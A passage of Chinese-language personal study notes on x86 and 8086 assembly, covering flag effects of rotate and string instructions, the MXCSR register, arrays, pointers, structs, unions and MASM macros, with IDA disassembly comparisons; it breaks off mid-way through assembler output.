ROR指令对标志位的影响：CF&#x3D;移入的数值 OF&#x3D;1 当count&#x3D;1时，移动后最高位的值发生变化。 OF&#x3D;0 当count&#x3D;1时，移动时最高位的值未发生变化。 带进位的循环左移 RCL指令对标志位的影响：CF&#x3D;移入的数值。 OF&#x3D;1 当cnt&#x3D;1时，移动后最高位的值未发生变化。 OF&#x3D;0 当cnt&#x3D;1时，移动后最高位的值发生变化。 SF、ZF、PF标志位不受影响。 带进位的循环右移 RCR指令对标志位的影响：CF&#x3D;移入的数值。 OF&#x3D;1 当cnt&#x3D;1时，操作数最高位的值未发生变化。 OF&#x3D;0 当cnt&#x3D;1时，操作数最高位的值发生变化。 SF、ZF、PF标志位不受影响。 串比较 CMPSB &#x2F; CMPSW(compare string byte&#x2F;word) 指令对条件码的影响： ​ CF&#x3D;1 二进制减法运算中最高有效位向高位有借位（被减数小于减数，不够减的情况） ​ CF&#x3D;0 二进制减法运算中最高有效为向高位无借位（被减数〉&#x3D;减数，够减的情况） ​ OF&#x3D;1 两数符号相反（正数-负数，或负数-正数），而结果符号与减数相同。 ​ OF&#x3D;0 同符号数相减时，或不同符号数相减，其结果符号与减数不同。 串扫描 SCASB &#x2F; SCASW(scan string byte &#x2F; word) 指令对条件码的影响： ​ CF&#x3D;1 二进制减法运算中最高有效位向高位有借位（被减数小于减数，不够减的情况） ​ CF&#x3D;0 二进制减法运算中最高有效为向高位无借位（被减数〉&#x3D;减数，够减的情况） ​ OF&#x3D;1 两数符号相反（正数-负数，或负数-正数），而结果符号与减数相同。 ​ OF&#x3D;0 同符号数相减时，或不同符号数相减，其结果符号与减数不同。 不影响串传送MOVSB &#x2F; MOVSW 指令对条件码的影响：不影响条件码。 存串 STOSB &#x2F; STOSW 指令对条件码的影响：不影响条件码。 取串LODSB &#x2F; LODSW (load from string byte&#x2F;word) 指令对条件码的影响：不影响条件码。 not 指令对标志位的影响：对标志位无影响 与标志寄存器有关的指令LAHF8086也有指令lahf&#x2F;sahf L的意思可能就是Load lahf是把所有的标志寄存器的低8位复制到ah sahf把ah的数据还给标志寄存器 SAHF把AH的数据给flag的低8位 pushf&#x2F;pushfd把16&#x2F;32位的寄存器数据压如栈 popf&#x2F;popfd把栈的值压入16&#x2F;32位的标志寄存器flag pushad是把通用寄存器入栈 pushfd是吧标志寄存器入栈 mxcsr寄存器 15 14 13 12 11 10 9 8 7 | 6 5 4 3 2 1 0 FZ RC RC PM UM OM ZM DM IM | DAZ PE UE OE ZE DE IE 下溢这0 舍入控制 舍入控制 精度掩码 下溢掩码 溢出掩码 除0错误掩码 非规格化操作掩码 无效操作掩码 | 非规格化操作 精度错误 下溢错误 溢出错误 除0错误 非规格化操作 无效操作错误 0-6位,也就是最后7位是异常发生的情况,发了就自动的置为1,没有发生就置位0 7-12位是对最后7位的一个异常屏蔽一一对应, 异常屏蔽置为了1,那么发生了异常也不会崩溃 异常屏蔽置为了0,那发生了异常就会崩溃 把DIY的mxcsr值放入寄存器 1ldmxcsr ds:mxcsr_before 把原有的mxcsr值放入一个内存 1stmxcsr ds:mxcsr_after 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051默认情况,没有异常10.0 / 2.0 = 5.0000000000000000, in hex: 0x4014000000000000mxcsr before: 0001 1111 1000 0000mxcsr after: 0001 1111 1000 0000精度异常10.0 / 3.0 = 3.3333333333333335, in hex: 0x 40 0a aa aa aa aa aa abmxcsr before: 0001 1111 1000 0000mxcsr after: 0001 1111 1010 0000除0异常10.0 / 0.0 = inf, in hex: 0x7ff0000000000000mxcsr before: 0001 1111 1000 0000mxcsr after: 0001 1111 1000 0100向上取整:10.0 / 3.0 = 3.3333333333333335, in hex: 0x400aaaaaaaaaaaabmxcsr before: 0101 1111 1000 0000mxcsr after: 0101 1111 1010 0000向下取整:10.0 / 3.0 = 3.3333333333333330, in hex: 0x400aaaaaaaaaaaaamxcsr before: 0011 1111 1000 0000mxcsr after: 0011 1111 1010 0000截断:10.0 / 3.0 = 3.3333333333333330, in hex: 0x400aaaaaaaaaaaaamxcsr before: 0111 1111 1000 0000mxcsr after: 0111 1111 1010 0000精度异常:11.0 / 3.0 = 3.6666666666666665, in hex: 0x400d555555555555mxcsr before: 0001 1111 1000 0000mxcsr after: 0001 1111 1010 0000向上取整::11.0 / y 3.0 = 3.6666666666666670, in hex: 0x400d555555555556mxcsr before: 0101 1111 1000 0000mxcsr after: 0101 1111 1010 0000向下取整:11.0 / 3.0 = 3.6666666666666665, in hex: 0x400d555555555555mxcsr before: 0011 1111 1000 0000mxcsr after: 0011 1111 1010 0000截断:11.0 /3.0 = 3.6666666666666665, in hex: 0x400d555555555555mxcsr before: 0111 1111 1000 0000mxcsr after: 0111 1111 1010 0000 这些异常处理我们针对不同的情况作了一些掩码 然后异常发生后,因为屏蔽作了掩码,就不会发生了异常 数据类型1、存储数据的宽度 杯子有多大 2、存储数据的格式 杯子能装什么 3、作用范围(作用域) 杯子可以在哪里用 关于变量声明 变量名 数据类型 数据值 而我们的变量名是可以缺少的,因为他的地址就可以引用它 没有变量名的地址就像一个没有名字的指针,我们很难引用它 在x86下, main函数的变量在text区域 然后放在esp的高位栈空间 变量的使用就push到低位栈空间 x64下 main函数的变量也是高位栈空间 但是你esp+32和ebp-8不都表示高位栈空间吗?于是x64用后者表示了数据分布 高频全局变量x68就是定义在data区的变量 为什么说是全局?因为你可以跳过地址去访问那段一直不会消失的空间 12345678.codemain PROC\txor eax,eax\t.data temp dw 2001h.code\tmov ax,temp 这样写的话,你的代码仍然会被放进data中,只不过是最后一个加入data的 x64123456789101112section .data var\tdq\t10.0 ;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\tsection .bss;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\tsection .text global main main: mov rbp, rsp; for correct debugging 于是你的var变量任意一个函数都可以访问 有符号的立即数1234567891011121314151617181920 .386 .model flat,stdcall option casemap:none\t.data\t.codestart: xor\tedx,edx xor\teax,eax mov eax,-101 //eax=0xffffff9b mov eax,9Bh //eax=9bh //9bh=-101 END start 可以看到负数与他的16进制还是有很大的区别的 所以我们才会有定义有符号的变量 好比var sdword\t-10 数组特点:地址连续,成员等宽 8086数组简要介绍123456789assume cs:codecode segmenta db 1,2,3,4,5,6,7,8,9,10b dw 1,2,3,4,5,6,7,8,9,10start: mov ax,4c00h int 21hcode endsend start 上面没有冒号: a其实代表了 1. byte ptr cs:[0] 2. 或者一个指向byte的指针 b的话就类推….. 123456789101112131415161718...code segmenta db 1,2,3,4,5,6,7,8,9,10b dw 1,2,3,4,5,6,7,8,9,10start: mov al,a;相当于mov al,cs:[0] mov bx,b;mov bx,cs:[10],因为就是b就在cs的第10个位置 mov a,66;相当于mov byte ptr cs:[0],66 mov b,88;相当于mov word ptr cs:[10],88 mov si,2 mov a[si],66;相当于mov byte ptr cs:[0+si],66;相当于mov byte ptr cs:0[si],66 mov si,3 mov b[si],77;相当于mov word ptr cs:[10+si],66;相当于mov word ptr cs:10[si],66; 指针数组12345data segment arr db 3,2,1 sum dw 0 the_ptr dw arr,sumdata ends 使用时的注意1️⃣假设你有 12345data segment table db &quot;0123456789ABCDEF&quot; index dw 0,0,0data ends 对于table的读取,只能是table[纯数字,或者bx] 你需要一个中间变量的引用 如果用mov ax,table[index]就会报错,无论怎么修改类型 123456789101112131415setscreen: jmp short set table dw sub1,sub2,sub3,sub4 s: push bx cmp ah,3 ja sret mov bl,ah mov bh,0 add bx,bx call word ptr table[bx];重点在这里 sret: pop bx ret 2️⃣错误源码如下 123mov bx,index mov\tbyte ptr ds:[index],alinc\tword ptr index IDA分析 123mov bx, word_10088mov byte ptr word_10088, alinc word_10088 上面在直接对index写入,而不是[index]写入 正确的源码如下 123mov bx,index mov byte ptr [bx],alinc word ptr index IDA 123mov bx, word_10088mov [bx], alinc word_10088 其实他就是需要一个中间值的转化 后面关于x86的形式也是一样的 x86数组简要的介绍一个例子 1234567891011.data Arr BYTE 5,4,3,2,1\tstr1 BYTE &quot;Dqx_Gh0st&quot; BYTE &quot;I am fine!&quot;,0\tstr2 \\ db &quot;This is Function pf &#x27;\\&#x27; !&quot;.stack ;db 16 dup(&#x27;S&#x27;).codemain PROC... 1️⃣. 值得注意的是 12Arr BYTE 5,4,3,2,1str1 BYTE &quot;Dqx_Gh0st&quot;,0 类似的声明它是不能在最后加上,逗号的,否者就报错 2️⃣. 12str2 \\ db &quot;This is Function pf &#x27;\\&#x27; !&quot; 关于第一行的\\ 它的作用就是连接第2行的数据 于是上面的代码就等效于 1str2 db &quot;This is Function pf &#x27;\\&#x27; !&quot; 它的作用就是一行写不下,另外一行 如何调用数组源码 12345mov al,[Arr+1]mov ah,[str2+3]mov ax,Arr[2*6]mov ax,Arr[esi]mov ax,Arr[esi*(type arr)];C语言 Arr[index*sizeof(int)] 在IDA里面它就是 123456mov al, byte_405001mov ah, byte_40501Cmov ax, byte_40500Dmov ax, byte_405010[esi]mov ax, word_404000[esi*2]//间接寻址的方式会更加的好看 这就是使用寄存器的好处.很直观 另外注意的是 如果Arr是 db型, Arr+1就是Arr[1] dw型,Arr+2*1才是Arr[1] 这不同于C语言,这里的每个++都是一个一个字节的处理 计算数组长度1️⃣$取地址 1234arr db 1,2,3,4,5,6arr_end\tdd $len =(arr_end-arr)/1//这个1是type arr 2️⃣lengthof直接算个数 123arr db 1,2,3,4,5, 6,7,8,9,10len = lengthof arr 指针汇编指针后面我才遇到,指针类型是ptr word, 而指针的使用是word ptr 这还是有很大的不同的 off_404012&#x3D;&#x3D;*(0x404012) off_404016&#x3D;&#x3D;*(0x404016) 而前面的word ptr或者byte ptr 只不过是强制类型转化 x86 指针用法 1234567891011121314151617181920212223title Dqx_Gh0st.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD\tdb_ptr typedef ptr bytedw_ptr typedef ptr word.data\tarr1 db 9,8,7,6,5,4,3,2\tarr2 dw 9,8,7,6,5,4,3,2,1\tptr1 dd arr1 ptr2 dd arr2.codemain PROC xor eax,eax ....\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main 你用了一个中间值的转化 然后就接没有问题 (在8086也遇到过这种情况) esi&#x3D;*(ptr1) 12345mov esi,ptr1mov al,byte ptr [ esi+ (type arr1)*4]mov esi,ptr2mov ax,word ptr [esi+ (type arr2)*5] 错误的用法 直接使用指针 1234567xor eax,eax mov al,byte ptr [ ptr1+ (type arr1)*4];错误的写法mov ax,word ptr [ ptr2+ (type arr2)*5];错误的写法xor eax,eaxmov ax, word ptr ptr1 [(type arr1)*4] ;错误的写法mov ax, word ptr ptr2 [(type arr2)*5];错误的写法 于是上面的ptr1就是变量ptr1的地址 *ptr1&#x3D;&amp;arr1 mov al,[ptr1+1*4]都是错的 反汇编和C指针x86 不管你是几级的指针,它的指针长度都是4字节 在反汇编结果里面也直接看不出来是几级指针 对于char*的指针 我们都知道,char* ptr 中ptr++是地址+1 对于char** ptr的指针,ptr++就是+4了 其它的可以类比 指针运算 (0). ​\t指针不可以乘除,可以加减, 运算的结果是int类型 ​\t运算,明面上是x参与运算,实际上是x*sizeof(xxx)参与运算 ​\t不同类型的指针,不可以运算 (2). 指针可以参与大小的比较 12345678#include&lt;stdio.h&gt;int main()&#123;\tint**** x = (int****)0;\tx=x+2;\tprintf(&quot;%p&quot;, x);\treturn 0;&#125; 最后,x&#x3D;8 不用多说 123456789101112131415#include&lt;stdio.h&gt;int main()&#123;\tshort* x = (short*)100;\tshort* y = (short*)200; printf(&quot;%d&quot;, y-x);\treturn 0;&#125;/* :50 :D:\\Code\\Vs-2022\\work\\w1\\Debug\\w1.exe (进程 4116)已退出，代码为 0。 :按任意键关闭此窗口. .*/ 输出50…是因为(200-100)/sizeof(short) 结构体[ebx+18]&#x3D;012 [ebx]&#x3D;0x12 提供[ebx+18]这种形式就大概可以看出他是结构体 特点: 结构体成员的地址连续,但是一般不是等宽 如何理解? 一个地址指向了一个数据区域 这个区域有db,dw,dd,dq….. 然后通过指针可以访问这些数据 这个指针是第一个元素的地址 对齐如果结构体成员最大字节&lt;默认对齐字节大小 ,按照最大成员字节对齐,而不是默认对齐 如果最大成员字节大小&gt;默认对齐,按照默认对齐的方式对齐 就近原则对齐,从局部到整体 声明与初始化123456789.data my_struct struct var1 db ? var2 dw ? var3 dd\t?my_struct\tends var1\tmy_truct\t&lt;&gt;;不初始化var2\tmy_struct\t&lt;1,2,3&gt;;初始话 123456789101112dqx_good STRUCT IdNum BYTE &quot;0000000&quot; LastName BYTE 20 DUP(0) ALIGN word Years WORD 0 ALIGN DWORD SalaryHistory DWORD 0,0,0,0 dqx_good ENDS person1 dqx_good &lt;&quot;2001&quot;,&quot;Dqx_Gh0st&quot;,100,&#123;4000h,,5000h,6000h&#125;&gt;//这是在声明的时候一起初始化 对于变量1 IdNum 的初始化,如果你写入的数据小于预设长度,剩下的用空格填充,也就是0x20 对于变量2 LsatName 的初始化,如果你写入的数据小于预设长度,剩下的用0初始化 对于最后一个数组的初始话,要加一个大括号&#123;&#125;才可以不报错,否则报错 如何使用12345678node struct\tnum dd ?\tnext WNDCLASS\t&lt;&gt;\tstop_flag\tdb ?node endsx\tnode\t&lt;20,,10&gt;//我们只是声明了外边2个变量,中间那个变量没有初始化 用这种形式的话,我们要assuem一下 1234mov esi,offset var2assume esi:ptr my_struct_type //定义esi为my_struct_type这种数据类型mov al, [esi].db_var1assume esi:nothing//取消定义 结构体数组假设有结构体 12345678dqx STRUCT ID BYTE &quot;000000000&quot; LastName\tBYTE 20 DUP(0) ALIGN word year WORD 0 ALIGN DWORD salary DWORD 0,0,0,0 dqx ENDS 然后定义一个数组 1arr\tdqx\t15 dup (&lt; &gt;) 调用它 1234mov esi,0arr[esi].year=100add\tesi,type xx_structarr[esi].num=200 包含结构体的结构体123456789101112a struct x db ?\ty db ?a endsb struct z a &lt;&gt;\tq a &lt;&gt;b ends;初始化一个变量dqx b &lt;&#123;1,2&#125;,&#123;3,4&#125;&gt; 就这样就定义了一个包含结构体的结构体 使用 1234567891011mov\tdqx.z.x,6mov\tesi,offset dqxmov\t(b ptr [esi]).z.y,7mov\tedi,OFFSET dqx.zmov\t(a PTR [edi]).x, 8mov\tedi,OFFSET dqx.z.ymov\tbyte PTR [edi], 9 内存布局他和数组在堆栈中的排布类似 第一个成员在栈上方 最后一个成员在栈下方 联合体一般的定义 12345Num UNION D DWORD 1 W WORD 5 B BYTE 8Num ENDS 把最大长度写在最前面,顺序呈降次 关于使用,Num的大小一直是最大尺度大小,也就是4字节 如果你初始化1字节,余下的字节就会用algin填充0, 1️⃣构体中的联合体 12345stu1 STRUCT ID1 Num &lt;&gt; Name1 BYTE 4 DUP(&#x27;X&#x27;)stu1 ENDS//沿用Num联合体 2️⃣在结构体里面声明,但是有点不一样 12345678stu2 STRUCT UNION ID2 D DWORD 70h W WORD 80h B BYTE 90h ENDS Name2 BYTE 4 DUP(&#x27;X&#x27;)stu2 ENDS 很奇怪,他有2个ends 第一个没有写ID2 ends 注意事项1 12345678Num UNION D DWORD 60h\tW WORD 70h\tB BYTE 80hNum ENDSs1 Num &lt;12345678h&gt;mov\ts1.B, 6 虽然你初始化了s1.b&#x3D;6,但是以前的数据还是没有全部丢失,你只是覆盖了0x78为6 以前是0x12345678,现在是0x12345606 注意事项2 12345Num UNION D DWORD 60h\tW WORD 70h\tB BYTE 80hNum ENDS 像这种声明,word,byte的数据会被dword掩盖,所以后面2句的初始化都是无效的 以供调试的代码 里面的字节对齐很有意思 algin的用法见目录篇:指令集 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- Num UNION D DWORD 60h\tW WORD 70h\tB BYTE 80hNum ENDSstu1 STRUCT ID1 Num &lt;&gt; Name1 BYTE 4 DUP(&#x27;X&#x27;)stu1 ENDSstu2 STRUCT UNION ID2 D DWORD 70h W WORD 80h B BYTE 90h ENDS Name2 BYTE 4 DUP(&#x27;X&#x27;)stu2 ENDS\ts1 Num &lt;12345678h&gt;s2 Num &lt;66h&gt;s3 Num &lt; &gt;s4 stu1 &lt; &gt;s5 stu2 &lt; &gt;;-------------------------------------------------------- ;function ;-------------------------------------------------------- .code;--------------------------------------------------------start: mov\ts1.B, 6 mov\ts2.W, 4 mov\ts3.D, 5 mov\ts4.ID1.B,9 mov\ts5.ID2.W,8 invoke\tExitProcess,NULL ;--------------------------------------------------------;function;----------------------------------------------------------end\tstart;----------------------------------------------------- 宏宏实在IDA里面不会出现的,在编译阶段实现一个数据的初始化与填充 在源代码的开头我们有 1234567891011121314151617;------------------------------------------------------------------------x=1.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD .codemain PROC xor eax,eax x=100 mov eax,x x=1000 mov eax,x\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main 一般会被定义位一个32位的数据长度 在汇编里面看到的是 1234567proc near ; CODE XREF: start↑jxor eax, eaxmov eax, 100mov eax, 1000push 0 ; uExitCodecall j_ExitProcesssub_402028 endp 可以看到,其实变量x并没有分配到内存,因为它不存在地址… 而且IDA里面也不会出现 12x=100x=1000 这些操作 可见它真的没有分配地址 正式因为这样才会有下面的错误 123push xx=6666pop x 你可以push一个立即数,那是因为你有一个接收数据的地方 但是你不可以pop一个数据到立即数,就好比pop 100 这一看就是一个大错误 宏声明在调用宏过程时，其代码的副本将被直接插入到程序中该宏被调用的位置。相当于一个字符串替换 位置宏定义一般出现在程序源代码开始的位置，或者是放在独立文件中，再用 INCLUDE 伪指令复制到程序里。 所以的话,你应该封装一下你的函数 就像书上恶心的第三方库函数 语法 123宏名称\tmacro 变量/指令\tendm 例子 12345678910111213141516include Dqx.incok\tmacro mov al,&#x27;X&#x27; mov bl,&#x27;Y&#x27;\tendm;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .code ;--------------------------------------------------------start: ok invoke\tExitProcess,NULLend\tstart;----------------------------------------------------- 于是在IDA的代码里面 1234567public startstart proc nearmov al, 58h ; &#x27;X&#x27;mov bl, 59h ; &#x27;Y&#x27;push 0 ; uExitCodecall ExitProcessstart endp 参数宏要在宏声明的时候,后面写几个参数就欧克 12345678910111213141516include Dqx.incm_ok\tmacro var1,var2 mov al,var1 mov bl,var2endm;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .code\t;--------------------------------------------------------start: m_ok 97,98 invoke\tExitProcess,NULLend\tstart;----------------------------------------------------- 如果你的参数给错了,参数给少了,怎么办? IDA 1234567public startstart proc nearmov al, 97 ; &#x27;X&#x27;mov bl, 98 ; &#x27;Y&#x27;push 0 ; uExitCodecall ExitProcessstart endp 函数宏普通版这里有2个函数宏 第一个函数宏的功能是创建字符串,然后记录下他的地址 第二个函数宏的功能是创建字符串,他的地址无法二次引用 思考一下第二个宏,每一次创建的字符串都叫@string.是有问题的.所以我们才用了local来解决这个问题 值得注意的是,里面的.data与.code伪指令不要忘了,会引起很大的失误的 如果你的宏只是在data区建立的话,就用不上写data与code 123456789101112131415161718192021222324252627282930313233include Dqx.incmakestr MACRO @name ,@text .data @name BYTE @text,0 .codeENDMmakestring MACRO @text LOCAL @string .data @string BYTE @text,0 .codeENDM;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data ;--------------------------------------------------------.codestart: makestr str1,&quot;Gh0st&quot; mov\tesi,offset str1 makestr str2,&quot;Dqx&quot; mov\tedi,offset str2 makestring &quot;Hello&quot; makestring &quot;I am fine&quot; invoke\tExitProcess,NULLend start;----------------------------------------------------- 其他版123456789isdefine macro button\tifdef button exitm&lt; 1 &gt;\telse exitm&lt; 0 &gt;\tendifendm exitm会返回一个数字给宏判断 然后 12345if ifdefine(flag)\tinclude xx.incelse\tinclude yy.incendif 差不多就这样用 后续遇到再补充 宏嵌套就是在一个宏里面嵌套另外一个宏 类似于函数调用 123456789101112131415161718192021222324include Dqx.incmakestr MACRO @name ,@text .data @name byte @text,0 .code show @textENDMshow MACRO @text echo @textENDM;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data ;--------------------------------------------------------.codestart: makestr str1,&quot;hi,Gh0st,I was created!&quot; mov\tesi,offset str1 invoke\tExitProcess,NULLend start;----------------------------------------------------- 条件宏如果满足条件,就把某段代码进行编译,否则就不进行编译 下面字母的缩写 B:blank,空的意思 D:define 伪指令 说明 IF 表达式 若 expression 为真（非零）则允许汇编。可能的关系运算符为 LT、GT、EQ、NE、LE 和 GE IFB &lt;var1,var2&gt; 如果没有实参传入形参,就返回true,指向语句块 IFNB &lt;var1,var2&gt; 如果非空,有参数的传进,就执行语句块 IFIDN&lt; arg1&gt;,&lt; arg2 &gt; 若两个实参相等（相同）则允许汇编。采用区分大小写的比较 IFIDNI&lt; arg1 &gt;,&lt; arg2&gt; 若两个实参相等（相同）则允许汇编。采用不区分大小写的比较 IFDIF&lt; arg1 &gt;,&lt; arg2&gt; 若两个实参不相等则允许汇编。采用区分大小写的比较 IFDIFI&lt; arg1&gt;,&lt; arg2&gt; 若两个实参不相等则允许汇编。采用不区分大小写的比较 IFDIF name 若 name 已定义则允许汇编 IFNDEF name 若 name 还未定义则允许汇编 ENDIF 结束用一个条件汇编伪指令开始的代码块 ELSE 若条件为真，则终止汇编之前的语句。若条件为假，ELSE 汇编语句直到遇到下一个 ENDIF ELSEIF expression 若之前条件伪指令指定的条件为假，而当前表达式为真，则汇编全部语句直到出现 ENDIF EXITM 立即退出宏，阻止所有后续宏语句的展开 例子:检测参数列表 试了一下,可以正确的检测2个参数,如果2个参数传递不够,就会语法错误,而不是执行else的语句 对于一个参数,是可以正常检测是否有的,如果传入就指向语句块,否则指向else 1234567891011121314151617181920212223include Dqx.incmakestr MACRO @name\tifnb &lt;@name&gt; .data @name byte &quot;hello,i am here&quot;,0 .code\telse echo haha,you are wrong\tendifENDM;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data ;--------------------------------------------------------.codestart: makestr invoke\tExitProcess,NULLend start;----------------------------------------------------- 后面详细的讲一下,条件宏 宏调用的默认参数初始化如果我们传入的参数不够,我们可以用ifb来检测,但是我们也可以使用默认参数来解决问题 语法 1宏名 macro 参数名:=&lt; xxx &gt; 例子 123456789101112131415161718192021222324include Dqx.incmakestr MACRO @name:=&lt;Empty_name&gt;,@str:=&lt;&quot;no string&quot;&gt; local @name .data @name byte @str,0 .code mov esi,offset @name push esi add esp,4ENDM;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data ;--------------------------------------------------------.codestart: makestr str1, makestr ,&quot;no name&quot; makestr good,&quot;bad&quot; invoke\tExitProcess,NULLend start;----------------------------------------------------- 上面之所以用local是因为,如果你一直不传入name的话,他会一直调用name作为关键字,导致name重复使用的语法错误 布尔表达式之前说了一下宏条件的if条件 他后面的表达式可以是布尔表达式 LT little,小于的意思 GT greate,大于的意思 EQ equal,等于的意思 NE not equal,不相等的意思 LE little and equal ,表示小于等于 GE greate and equal,大于等于 好比这么用 12if (X LT 0) or (Y GT 79)\t.... IF&#x2F;ELSE&#x2F;ENDIF它后面可以接 整数常量 符号常量 常量 什么叫符号常量?什么叫整数常量 但不可以接寄存器或者变量名 常有的形式有 123if endif 还有 12345ifesleendif 特殊运算符&amp; 替换符号1234567891011121314151617181920include Dqx.incmakestr MACRO b_name:=&lt;Empty_name&gt;,b_str:=&lt;no string&gt; local b_name .data b_name byte &amp;b_str,0 .code mov esi,offset b_nameENDM;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data ;--------------------------------------------------------.codestart: makestr one, &quot;I was a str!&quot; invoke\tExitProcess,NULLend start;----------------------------------------------------- 你的参数&quot;I was a str!&quot;会用在&amp;b_str,然后直接别替换掉 感觉没太大的用 而且与原来的用法有什么区别我还不知道 % 格式转化在TEXTEQU的运用 123456789101112131415161718include Dqx.inc;makestr MACRO ;ENDMDigit = 4Num textequ %(Digit+5);&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data ;--------------------------------------------------------.codestart: mov eax,Num invoke\tExitProcess,NULLend start;----------------------------------------------------- 在之前我们也有提及textequ的宏 例子1 1234567891011121314151617181920212223include Dqx.inc;makestr MACRO ;ENDM;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tarr db 9 dup(&#x27;C&#x27;) ;--------------------------------------------------------.codestart: echo The arr contains (SIZEOF arr) bytes\t;wrong echo The arr contains %(SIZEOF arr) bytes\t;wrong how_many textequ %(SIZEOF arr) ;正确的 % echo The arr contains how_many bytes invoke\tExitProcess,NULLend start;----------------------------------------------------- 输出 1234567891011121314151617181920Microsoft (R) Program Maintenance Utility Version 14.31.31105.0Copyright (C) Microsoft Corporation. All rights reserved. ml /c /coff x.asmMicrosoft (R) Macro Assembler Version 6.14.8444Copyright 